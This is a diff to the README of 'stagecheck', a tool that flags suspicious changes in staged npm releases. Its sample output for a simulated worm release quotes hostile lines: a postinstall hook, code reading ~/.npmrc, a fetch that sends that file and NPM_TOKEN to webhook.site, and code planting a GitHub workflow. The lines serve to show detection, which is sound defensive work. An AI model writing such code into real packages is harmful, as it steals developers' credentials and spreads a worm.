@@ -6,20 +6,26 @@
 [![CI](https://github.com/daniel63194/stagecheck/actions/workflows/ci.yml/badge.svg)](https://github.com/daniel63194/stagecheck/actions/workflows/ci.yml)
 [![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/daniel63194/stagecheck/badge)](https://scorecard.dev/viewer/?uri=github.com/daniel63194/stagecheck)
 [![OpenSSF Best Practices](https://www.bestpractices.dev/projects/15405/badge)](https://www.bestpractices.dev/projects/15405)
+[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-stagecheck-2ea44f?logo=github)](https://github.com/marketplace/actions/stagecheck-npm-release-review)
+
+![npx stagecheck reviewing a staged release of color-utils 2.3.1: five high-risk findings, including a new postinstall script, code that reads .npmrc and uploads it to webhook.site, a planted GitHub workflow and an npm publish call](docs/stagecheck-demo.svg)
+
+<details>
+<summary>Show the output as text</summary>
 
 ```console
 $ npx stagecheck
 1 staged release waiting for approval.
 
 color-utils 2.3.0 → 2.3.1  staged by ci-bot (token)
-  files: 1 added, 1 modified, 0 removed · size 271 B → 709 B (+162%)
+  files: 1 added, 1 modified, 0 removed · size 271 B → 685 B (+153%)
 
   HIGH   package.json adds a "postinstall" script, which runs automatically on install
          node bundle.js
   HIGH   bundle.js reads credentials or credential files (×2)
          const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
   HIGH   bundle.js contacts a service commonly used to exfiltrate data
-         fetch('https://webhook.site/6f1c2a', { method: 'POST', body: JSON.stringify({ npmrc, env: process.env.NPM_TOKEN }) });
+         fetch('https://webhook.site/6f1c2a', { method: 'POST', body: npmrc + process.env.NPM_TOKEN });
   HIGH   bundle.js references GitHub Actions workflow files (worms such as Shai-Hulud plant workflows)
          fs.writeFileSync('.github/workflows/shai-hulud.yml', workflow);
   HIGH   bundle.js runs npm account or publish commands from shipped code (self-propagating worms do this)
@@ -32,8 +38,10 @@ color-utils 2.3.0 → 2.3.1  staged by ci-bot (token)
 
   5 high-risk findings: review carefully before approving.
 
-color-utils@2.3.1: [a]pprove, [r]eject, [s]kip, [q]uit? (s) r
+color-utils@2.3.1: [a]pprove, [r]eject, [s]kip, [q]uit? (s)
 ```
+
+</details>
 
 *(A simulated worm release. For an ordinary release, stagecheck prints `✓ No red flags found.`)*
 
@@ -41,6 +49,7 @@ color-utils@2.3.1: [a]pprove, [r]eject, [s]kip, [q]uit? (s) r
 - **Diff-based, so it stays quiet.** It reports what a release *introduces*. If your package has always spawned processes, that is not news; a utility library that suddenly starts reading `~/.npmrc` is.
 - **Works on any package.** Review a dependency update before you install it: `npx stagecheck review axios@1.13.2`.
 - **Fast.** It reads tarballs in memory and never runs package code. A typical review takes about a second.
+- **Verifiable.** Every stagecheck release is reviewed by stagecheck itself, staged, approved with 2FA, and signed with SLSA build provenance. See [Verifying stagecheck itself](#verifying-stagecheck-itself).
 
 ## Why
 
